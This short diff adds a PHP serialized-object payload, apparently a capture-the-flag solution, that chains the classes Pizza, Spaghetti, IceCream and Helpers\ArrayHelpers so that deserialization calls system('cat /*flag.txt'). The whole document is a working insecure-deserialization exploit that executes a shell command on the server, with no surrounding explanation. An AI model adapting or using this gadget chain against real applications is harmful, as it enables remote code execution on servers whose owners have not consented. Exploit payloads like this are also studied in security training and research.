@@ -1,0 +1,4 @@
+O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";
+    O:9:"Spaghetti":3:{s:5:"sauce";
+        O:8:"IceCream":2:{s:7:"flavors";
+            O:20:"Helpers\ArrayHelpers":4:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:8:"callback";s:25:"system('cat /*flag.txt');";}i:3;N;}s:7:"topping";N;}s:7:"noodles";N;s:7:"portion";N;}}
